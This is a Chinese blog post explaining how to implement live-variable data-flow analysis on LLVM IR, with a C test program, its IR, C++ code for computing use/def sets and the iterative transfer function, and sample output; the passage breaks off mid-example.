    <content type="html"><![CDATA[<h1 id="基于-llvm-实现活跃变量分析"><a href="#基于-llvm-实现活跃变量分析" class="headerlink" title="基于 llvm 实现活跃变量分析"></a>基于 llvm 实现活跃变量分析</h1><h2 id="活跃变量分析"><a href="#活跃变量分析" class="headerlink" title="活跃变量分析"></a>活跃变量分析</h2><p>活跃变量分析是最典型的数据流分析的算法之一，它的作用是确定变量在程序中的活跃性。</p><p>变量在某个程序点有两种状态，<code>live</code> 或 <code>dead</code>。对于变量 x 和程序点 p，判断 x 在点 p 上的值是否会在 CFG 中的某条从点 p 出发的路径中使用。如果是，就说 x 在 p 上 <code>live</code>；否则就说x在p上是 <code>dead</code>。</p><p>活跃变量分析主要作用</p><ol><li>寄存器分配</li><li>死代码删除</li></ol><h2 id="活跃变量计算算法"><a href="#活跃变量计算算法" class="headerlink" title="活跃变量计算算法"></a>活跃变量计算算法</h2><img src="/2021/04/06/LLVM-Liveness-Analysis/image-20210406154854014.png" class="" title="image-20210406154854014"><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>整体思路</p><ol><li>单独计算每个基本块的 $use_B$ 与 $def_B$ 集合 （是否可以先把基本块转为DAG形式？）</li><li>后序遍历分析函数的基本块，对每个基本块应用 TransferFunction</li><li>一直迭代，直到 IN 集合不再改变</li></ol><p>细节思路</p><ol><li>集合运算采用 llvm::BitVector 加速分析</li><li>$OUT[B] - def_B$ 位运算等价于 $OUT[B] \And Not(def_B)$</li></ol><h2 id="测试样例程序"><a href="#测试样例程序" class="headerlink" title="测试样例程序"></a>测试样例程序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sum</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (i = a; i &lt; b; i++)<br>    &#123;<br>        res *= i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span> </span>&#123;<br>    sum(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>只分析 sum 函数</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">define</span> <span class="hljs-type">i32</span> <span class="hljs-title">@_Z3sumii</span>(<span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>) <span class="hljs-variable">#0</span> &#123;<br>  <span class="hljs-variable">%3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%0</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%3</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%1</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%4</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%6</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%7</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%3</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%7</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">br</span> label <span class="hljs-variable">%8</span><br><br><span class="hljs-number">8</span>:                                                <span class="hljs-comment">; preds = %16, %2</span><br>  <span class="hljs-variable">%9</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%4</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%11</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">icmp</span> <span class="hljs-keyword">slt</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%9</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%10</span><br>  <span class="hljs-keyword">br</span> <span class="hljs-type">i1</span> <span class="hljs-variable">%11</span><span class="hljs-punctuation">,</span> label <span class="hljs-variable">%12</span><span class="hljs-punctuation">,</span> label <span class="hljs-variable">%19</span><br><br><span class="hljs-number">12</span>:                                               <span class="hljs-comment">; preds = %8</span><br>  <span class="hljs-variable">%test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span>                     <span class="hljs-comment">; 用于测试活跃性手动添加</span><br>  <span class="hljs-variable">%13</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%14</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%6</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%15</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">mul</span> <span class="hljs-keyword">nsw</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%14</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%13</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%15</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%6</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">br</span> label <span class="hljs-variable">%16</span><br><br><span class="hljs-number">16</span>:                                               <span class="hljs-comment">; preds = %12</span><br>  <span class="hljs-variable">%test2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%test</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span>          <span class="hljs-comment">; 用于测试活跃性手动添加</span><br>  <span class="hljs-variable">%17</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%18</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">nsw</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%17</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%18</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">br</span> label <span class="hljs-variable">%8</span><br><br><span class="hljs-number">19</span>:                                               <span class="hljs-comment">; preds = %8</span><br>  <span class="hljs-variable">%20</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%6</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%3</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span>                <span class="hljs-comment">; 用于测试活跃性手动添加</span><br>  <span class="hljs-keyword">ret</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%20</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="映射-BitVec-与定值的关系"><a href="#映射-BitVec-与定值的关系" class="headerlink" title="映射 BitVec 与定值的关系"></a>映射 BitVec 与定值的关系</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InitializeBitVector</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> allocaCounter = <span class="hljs-number">0</span>;<br>    errs() &lt;&lt; <span class="hljs-string">&quot;BitVec map:\n&quot;</span>;<br><br>    <span class="hljs-comment">// 处理函数的参数，给参数分配位向量</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> arg = targetFunc-&gt;arg_begin(); arg != targetFunc-&gt;arg_end(); arg++) &#123;<br>        Value * v = dyn_cast&lt;Value&gt;(arg);<br>        InstBitMap[v] = allocaCounter;<br>        errs() &lt;&lt; allocaCounter &lt;&lt; <span class="hljs-string">&quot;  &quot;</span>;<br>        allocaCounter++;<br>        v-&gt;dump();<br>    &#125;<br><span class="hljs-comment">// 处理所有定值指令</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> bb : <span class="hljs-keyword">this</span>-&gt;bbList) &#123;<br>        <span class="hljs-keyword">for</span>(BasicBlock::iterator insIter = bb-&gt;begin(); insIter != bb-&gt;end(); insIter++) &#123;<br>            Value * v = dyn_cast&lt;Value&gt;(insIter);<br>            <span class="hljs-keyword">if</span> (isDefFocusInst(v)) &#123;<br>                InstBitMap[v] = allocaCounter;<br>                errs() &lt;&lt; allocaCounter;<br>                allocaCounter++;<br>                v-&gt;dump();<br>            &#125;<br>        &#125;<br>    &#125;<br>    ......................<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出样本如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs llvm">BitVec map:<br><span class="hljs-number">0</span>  <span class="hljs-type">i32</span> <span class="hljs-variable">%0</span><br><span class="hljs-number">1</span>  <span class="hljs-type">i32</span> <span class="hljs-variable">%1</span><br><span class="hljs-number">2</span>  <span class="hljs-variable">%test2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%test</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">3</span>  <span class="hljs-variable">%17</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">4</span>  <span class="hljs-variable">%18</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">nsw</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%17</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><br><span class="hljs-number">5</span>  <span class="hljs-variable">%test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">6</span>  <span class="hljs-variable">%13</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">7</span>  <span class="hljs-variable">%14</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%6</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">8</span>  <span class="hljs-variable">%15</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">mul</span> <span class="hljs-keyword">nsw</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%14</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%13</span><br><span class="hljs-number">9</span>  <span class="hljs-variable">%20</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%6</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">10</span>  <span class="hljs-variable">%aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%3</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">11</span>  <span class="hljs-variable">%9</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">12</span>  <span class="hljs-variable">%10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%4</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">13</span>  <span class="hljs-variable">%11</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">icmp</span> <span class="hljs-keyword">slt</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%9</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%10</span><br><span class="hljs-number">14</span>  <span class="hljs-variable">%3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">15</span>  <span class="hljs-variable">%4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">16</span>  <span class="hljs-variable">%5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">17</span>  <span class="hljs-variable">%6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">18</span>  <span class="hljs-variable">%7</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%3</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>测试样例一共有 19 个定值，每一个定值对应 BitVector 中的一个二进制位。</p><h2 id="use-与-def-的计算"><a href="#use-与-def-的计算" class="headerlink" title="use 与 def 的计算"></a>use 与 def 的计算</h2><p>有一种特殊情况，需要考虑，例如某个基本块如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">b</span> = a<br><span class="hljs-attr">d</span> = c<br></code></pre></td></tr></table></figure><p>use = {c}, def = {a, b, d}</p><p>因为 <code>a</code> 的定值在当前基本块内且在引用之前，所以 use 集合中没有 <code>a</code></p><p>在 llvm 分析中，分析基本块 def 的时候应该去掉有“定值”作用的指令，例如 <code>BranchInst</code>, <code>StoreInst</code>, <code>ReturnInst</code>等….</p><p>分析 use 的时候，应该去掉对 <code>BranchInst</code>,<code>Contant</code> 等…</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AnalysisDefAndUseSet</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> bb : <span class="hljs-keyword">this</span>-&gt;bbList) &#123;<br>        <span class="hljs-keyword">auto</span> &amp; defSets = <span class="hljs-keyword">this</span>-&gt;DefSet[bb];<br>        <span class="hljs-keyword">auto</span> &amp; useSets = <span class="hljs-keyword">this</span>-&gt;UseSet[bb];<br>        <span class="hljs-keyword">for</span>(BasicBlock::iterator insIter = bb-&gt;begin(); insIter != bb-&gt;end(); insIter++) &#123;<br>            Value * val = dyn_cast&lt;Value&gt;(insIter);<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp; op : insIter-&gt;operands()) &#123;<br>                Value * opValue = op.get();<br>                <span class="hljs-keyword">if</span> (<br>                    !dyn_cast&lt;Constant&gt;(opValue)<br>                    &amp;&amp; !dyn_cast&lt;BasicBlock&gt;(opValue)<br>                    &amp;&amp; InstBitMap.count(opValue) &gt;= <span class="hljs-number">1</span><br>                    &amp;&amp; !defSets[InstBitMap[opValue]]<br>                    &amp;&amp; !useSets[InstBitMap[opValue]]) &#123;<br>                    useSets[InstBitMap[opValue]] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;isDefFocusInst(val)) &#123;<br>                defSets[InstBitMap[val]] = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        errs() &lt;&lt; <span class="hljs-string">&quot;defs:\n&quot;</span>;<br>        printSET(defSets);<br>        errs() &lt;&lt; <span class="hljs-string">&quot;uses:\n&quot;</span>;<br>        printSET(useSets);<br>        errs() &lt;&lt; <span class="hljs-string">&quot;================ \n&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试样例某基本块输出如下:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">defs:</span><br><span class="hljs-number">0</span>   <span class="hljs-variable">%test2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%test</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">1</span>   <span class="hljs-variable">%17</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">2</span>   <span class="hljs-variable">%18</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">nsw</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%17</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">uses:</span><br><span class="hljs-number">3</span>   <span class="hljs-variable">%test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">14</span>   <span class="hljs-variable">%5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>该基本块生成有 3个定值，引用外部两个定值  <code>%test2</code> 和 <code>%5</code> 均不在该基本块，因此属于 use 集合。</p><p>Entry 基本块的 use 集合只有参数，因为对于 Entry 来说，参数是外部的。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">defs:</span><br><span class="hljs-number">14</span>   <span class="hljs-variable">%3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">15</span>   <span class="hljs-variable">%4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">16</span>   <span class="hljs-variable">%5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">17</span>   <span class="hljs-variable">%6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">18</span>   <span class="hljs-variable">%7</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%3</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">uses:</span><br><span class="hljs-number">0</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%0</span><br><span class="hljs-number">1</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%1</span><br></code></pre></td></tr></table></figure><h2 id="迭代计算活跃性"><a href="#迭代计算活跃性" class="headerlink" title="迭代计算活跃性"></a>迭代计算活跃性</h2><p>迭代计算，直到所有基本块的IN集合不再改变。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">TransferBB</span><span class="hljs-params">(BasicBlock * bb)</span> </span>&#123;<br>    <span class="hljs-keyword">bool</span> changed = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>( BasicBlock * succ: successors(bb))<br>        <span class="hljs-keyword">this</span>-&gt;BBOUTSet[bb] |= <span class="hljs-keyword">this</span>-&gt;BBINSet[succ];<br>    BitVector bv = <span class="hljs-keyword">this</span>-&gt;UseSet[bb];<br>    BitVector df = <span class="hljs-keyword">this</span>-&gt;DefSet[bb];<br>    df.flip();<br>    df &amp;= <span class="hljs-keyword">this</span>-&gt;BBOUTSet[bb];<br>    bv |= df;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;BBINSet[bb] != bv)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;BBINSet[bb] = bv;<br>        changed = <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> changed;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据样例"><a href="#数据样例" class="headerlink" title="数据样例"></a>数据样例</h3><p>第一次迭代16基本块：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 